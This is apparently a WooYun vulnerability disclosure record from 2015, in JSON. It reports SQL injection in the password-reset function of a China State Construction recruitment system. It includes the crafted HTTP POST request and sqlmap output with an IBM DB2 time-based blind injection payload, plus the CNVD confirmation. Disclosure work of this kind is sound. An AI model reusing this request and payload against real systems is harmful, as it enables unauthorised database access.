{"id": 67996, "wybug_id": "wooyun-2015-0141617", "wybug_title": "中国建筑股份有限公司某系统SQL注入", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "路人甲", "wybug_date": "2015-09-20 00:12", "wybug_open_date": "2015-11-06 19:56", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-22：\tcncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开\t\t\t\t\t\t\t\t\t2015-10-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-06：\t细节向公众公开  简要描述： RT 详细说明：  中国建筑股份有限公司某招聘系统存在SQL注入   漏洞证明：  系统地址：http://**.**.**.**/hrss/rm/RmMain.jsp?dsName=design，在找回密码功能中存在SQL注入。构造如下数据\nPOST /hrss/dorado/smartweb2.RPC.d?__rpc=true HTTP/1.1Accept: */*Accept-Language: zh-cnPragma: no-cacheReferer: http://**.**.**.**/hrss/rm/ResetPwd.jsp?Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)Host: **.**.**.**Content-Length: 584Proxy-Connection: Keep-AliveCookie: JSESSIONID=0000RzM_ahWhjIHz9xWBQT4uoD0:17clokus8__type=updateData&__viewInstanceId=nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel&__xml=%3Crpc%20transaction%3D%2210%22%20method%3D%22resetPwd%22%3E%3Cdef%3E%3Cdataset%20type%3D%22Custom%22%20id%3D%22dsResetPwd%22%3E%3Cf%20name%3D%22user%22/%3E%3C/dataset%3E%3C/def%3E%3Cdata%3E%3Crs%20dataset%3D%22dsResetPwd%22%3E%3Cr%20id%3D%2210008%22%20state%3D%22insert%22%3E%3Cn%3E%3Cv%3E123456*%3C/v%3E%3C/n%3E%3C/r%3E%3C/rs%3E%3C/data%3E%3Cvps%3E%3Cp%20name%3D%22__profileKeys%22%3EfindPwd%253B9589d8b622333776899b3ff0567f4603%3C/p%3E%3C/vps%3E%3C/rpc%3E%0D%0A&1442387826777\n使用SQLMAP跑一下：\nsqlmap identified the following injection points with a total of 226 HTTP(s) requests:---Parameter: #1* ((custom) POST)    Type: AND/OR time-based blind    Title: IBM DB2 AND time-based blind (heavy query)    Payload: __type=updateData&__viewInstanceId=nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel&__xml=<rpc transaction=\"10\" method=\"resetPwd\"><def><dataset type=\"Custom\" id=\"dsResetPwd\"><f name=\"user\"/></dataset></def><data><rs dataset=\"dsResetPwd\"><r id=\"10008\" state=\"insert\"><n><v>123456' AND 6215=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3) AND 'KMlo'='KMlo</v></n></r></rs></data><vps><p name=\"__profileKeys\">findPwd%3B9589d8b622333776899b3ff0567f4603</p></vps></rpc>&1442387826777---back-end DBMS: IBM DB2\n证明存在注入即可。   修复方案：  该！   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2015-09-22 19:54 厂商回复： CNVD确认并复现所述情况，已经由CNVD通过以往建立的处置渠道向网站管理单位通报，由其后续提供解决方案。  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}